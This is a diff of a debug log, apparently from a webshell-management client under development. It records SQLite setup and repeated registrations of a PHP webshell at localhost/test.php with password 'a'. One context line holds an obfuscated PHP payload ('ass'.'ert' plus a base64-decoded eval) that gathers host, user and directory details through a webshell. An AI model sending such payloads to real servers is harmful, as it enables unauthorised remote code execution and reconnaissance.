@@ -843,3 +843,74 @@ test.php	2018-10-14 16:41:16	36	0666
 2018-10-20 22:59:52,262:59:DEBUG:Params: array_map("ass"."ert",array("ev"."Al(\"\\\$xx%3D\\\"Ba"."SE6"."4_dEc"."OdE\\\";@ev"."al(\\\$xx('cHJpbnQgIlBHUCI7JEQ9ZGlybmFtZShfX0ZJTEVfXyk7JFI9InskRH1cdCI7aWYoc3Vic3RyKCRELDAsMSkhPSIvIil7Zm9yZWFjaChyYW5nZSgiQSIsIloiKSBhcyAkTClpZihpc19kaXIoInskTH06IikpJFIuPSJ7JEx9OiI7fSRSLj0iXHQiOyR1PShmdW5jdGlvbl9leGlzdHMoJ3Bvc2l4X2dldGVnaWQnKSk/QHBvc2l4X2dldHB3dWlkKEBwb3NpeF9nZXRldWlkKCkpOicnOyR1c3I9KCR1KT8kdVsnbmFtZSddOkBnZXRfY3VycmVudF91c2VyKCk7JFIuPXBocF91bmFtZSgpOyRSLj0iKHskdXNyfSkiO3ByaW50ICRSO3ByaW50ICJQR1AiOw=='));\");"));
 2018-10-20 22:59:54,384:140:DEBUG:(999, 'Exception', URLError(ConnectionRefusedError(10061, '由于目标计算机积极拒绝，无法连接。', None, 10061, None),))
 2018-10-21 21:16:29,829:69:DEBUG:Add shell: {'url': 'http://localhost/test.php', 'pwd': 'a', 'type': 'php', 'encoding': 'UTF-8', 'sqlconf': '', 'category': 'default', 'tag': 'test'}
+2018-10-23 23:31:24,218:15:INFO:Init database...
+2018-10-23 23:31:24,251:98:DEBUG:Excute sql:             CREATE TABLE 'box' (
+            'id' INTEGER PRIMARY KEY AUTOINCREMENT,
+            'url' VARCHAR(128),
+            'pwd' VARCHAR(8),
+            'type' VARCHAR(4),
+            'encoding' VARCHAR(16),
+            'category' VARCHAR(32) default 'default',
+            'sqlconf' TEXT,
+            'tag' TEXT,
+            'geo' VARCHAR(4),
+            'status' VARCHAR(4),
+            'c_time' TIMESTAMP not null default (datetime('now','localtime')),
+            'e_time' TIMESTAMP not null default (datetime('now','localtime'))
+            );
+            
+2018-10-23 23:31:24,329:98:DEBUG:Excute sql:             CREATE TABLE 'site_cache' (
+            'id' INTEGER PRIMARY KEY AUTOINCREMENT,
+            'sid' INTEGER,
+            'path' TEXT,
+            'cache' BLOB
+            );
+            
+            
+2018-10-23 23:31:24,405:98:DEBUG:Excute sql:             create trigger box_Update before update on box
+            for each row
+            begin
+            update box set e_time = datetime('now','localtime') where id=old.id;
+            end;
+            
+2018-10-23 23:32:15,494:69:DEBUG:Add shell: {'url': 'http://localhost/test.php', 'pwd': 'a', 'type': 'php', 'encoding': 'UTF-8', 'sqlconf': '', 'category': 'default', 'tag': ''}
+2018-10-24 00:25:20,260:69:DEBUG:Add shell: {'url': 'http://localhost/test.php', 'pwd': 'a', 'type': 'php', 'encoding': 'UTF-8', 'sqlconf': '', 'category': 'default', 'tag': ''}
+2018-10-24 00:27:10,927:69:DEBUG:Add shell: {'url': 'http://localhost/test.pnp', 'pwd': 'a', 'type': 'php', 'encoding': 'UTF-8', 'sqlconf': '', 'category': 'default', 'tag': ''}
+2018-10-24 00:27:10,929:101:DEBUG:Excute sql: INSERT INTO box (url,pwd,type,encoding,sqlconf,category,tag) VALUES (?,?,?,?,?,?,?) with data (dict_values(['http://localhost/test.pnp', 'a', 'php', 'UTF-8', '', 'default', '']))
+2018-10-24 00:28:51,490:69:DEBUG:Add shell: {'url': 'http://localhost/test.php', 'pwd': 'a', 'type': 'php', 'encoding': 'UTF-8', 'sqlconf': '', 'category': 'default', 'tag': ''}
+2018-10-24 00:28:51,491:102:DEBUG:Excute sql: INSERT INTO box (url,pwd,type,encoding,sqlconf,category,tag) VALUES (?,?,?,?,?,?,?) with data (('http://localhost/test.php', 'a', 'php', 'UTF-8', '', 'default', ''))
+2018-10-24 00:28:51,548:73:DEBUG:Get shell with sid: None
+2018-10-24 00:30:35,324:69:DEBUG:Add shell: {'url': 'http://localhost/test.php', 'pwd': 'a', 'type': 'php', 'encoding': 'UTF-8', 'sqlconf': '', 'category': 'default', 'tag': ''}
+2018-10-24 00:30:35,326:102:DEBUG:Excute sql: INSERT INTO box (url,pwd,type,encoding,sqlconf,category,tag) VALUES (?,?,?,?,?,?,?) with data ('http://localhost/test.php', 'a', 'php', 'UTF-8', '', 'default', '')
+2018-10-24 00:30:35,378:73:DEBUG:Get shell with sid: None
+2018-10-24 00:59:37,384:69:DEBUG:Add shell: {'url': 'http://localhost/test.php', 'pwd': 'a', 'type': 'php', 'encoding': 'UTF-8', 'sqlconf': '', 'category': 'default', 'tag': ''}
+2018-10-24 00:59:37,386:102:DEBUG:Excute sql: INSERT INTO box (url,pwd,type,encoding,sqlconf,category,tag) VALUES (?,?,?,?,?,?,?) with data ('http://localhost/test.php', 'a', 'php', 'UTF-8', '', 'default', '')
+2018-10-24 00:59:37,437:73:DEBUG:Get shell with sid: None
+2018-10-24 06:30:42,272:69:DEBUG:Add shell: {'url': 'http://localhost/test.php', 'pwd': 'a', 'type': 'php', 'encoding': 'UTF-8', 'sqlconf': '', 'category': 'default', 'tag': ''}
+2018-10-24 06:30:42,274:102:DEBUG:Excute sql: INSERT INTO box (url,pwd,type,encoding,sqlconf,category,tag) VALUES (?,?,?,?,?,?,?) with data ('http://localhost/test.php', 'a', 'php', 'UTF-8', '', 'default', '')
+2018-10-24 06:30:42,486:73:DEBUG:Get shell with sid: None
+2018-10-24 06:32:27,248:69:DEBUG:Add shell: {'url': 'http://localhost/test.php', 'pwd': 'a', 'type': 'php', 'encoding': 'UTF-8', 'sqlconf': '', 'category': 'default', 'tag': ''}
+2018-10-24 06:32:27,249:102:DEBUG:Excute sql: INSERT INTO box (url,pwd,type,encoding,sqlconf,category,tag) VALUES (?,?,?,?,?,?,?) with data ('http://localhost/test.php', 'a', 'php', 'UTF-8', '', 'default', '')
+2018-10-24 06:32:27,305:73:DEBUG:Get shell with sid: None
+2018-10-24 06:33:03,007:69:DEBUG:Add shell: {'url': 'http://localhost/test.php', 'pwd': 'a', 'type': 'php', 'encoding': 'UTF-8', 'sqlconf': '', 'category': 'default', 'tag': ''}
+2018-10-24 06:33:03,008:102:DEBUG:Excute sql: INSERT INTO box (url,pwd,type,encoding,sqlconf,category,tag) VALUES (?,?,?,?,?,?,?) with data ('http://localhost/test.php', 'a', 'php', 'UTF-8', '', 'default', '')
+2018-10-24 06:33:03,070:73:DEBUG:Get shell with sid: None
+2018-10-24 06:34:35,594:69:DEBUG:Add shell: {'url': 'http://localhost/test.php', 'pwd': 'a', 'type': '', 'encoding': 'utf-8', 'sqlconf': '', 'category': 'default', 'tag': ''}
+2018-10-24 06:34:35,596:102:DEBUG:Excute sql: INSERT INTO box (url,pwd,type,encoding,sqlconf,category,tag) VALUES (?,?,?,?,?,?,?) with data ('http://localhost/test.php', 'a', '', 'utf-8', '', 'default', '')
+2018-10-24 06:34:35,645:73:DEBUG:Get shell with sid: None
+2018-10-24 06:39:43,389:73:DEBUG:Get shell with sid: None
+2018-10-24 06:47:59,197:73:DEBUG:Get shell with sid: None
+2018-10-24 07:00:36,542:73:DEBUG:Get shell with sid: None
+2018-10-24 07:00:44,711:73:DEBUG:Get shell with sid: None
+2018-10-24 07:01:36,592:73:DEBUG:Get shell with sid: None
+2018-10-24 07:02:10,020:73:DEBUG:Get shell with sid: None
+2018-10-24 07:05:58,800:73:DEBUG:Get shell with sid: None
+2018-10-24 07:09:21,272:73:DEBUG:Get shell with sid: None
+2018-10-24 07:10:24,522:73:DEBUG:Get shell with sid: None
+2018-10-24 07:11:08,035:73:DEBUG:Get shell with sid: None
+2018-10-24 07:15:39,278:73:DEBUG:Get shell with sid: None
+2018-10-24 07:19:35,967:73:DEBUG:Get shell with sid: None
+2018-10-24 07:19:46,902:73:DEBUG:Get shell with sid: None
+2018-10-24 07:20:28,615:69:DEBUG:Add shell: {'url': 'http://localhost/test2.php', 'pwd': 'www', 'type': 'php', 'encoding': 'GBK', 'sqlconf': '', 'category': 'group1', 'tag': ''}
+2018-10-24 07:20:28,616:102:DEBUG:Excute sql: INSERT INTO box (url,pwd,type,encoding,sqlconf,category,tag) VALUES (?,?,?,?,?,?,?) with data ('http://localhost/test2.php', 'www', 'php', 'GBK', '', 'group1', '')
+2018-10-24 07:20:28,680:73:DEBUG:Get shell with sid: None
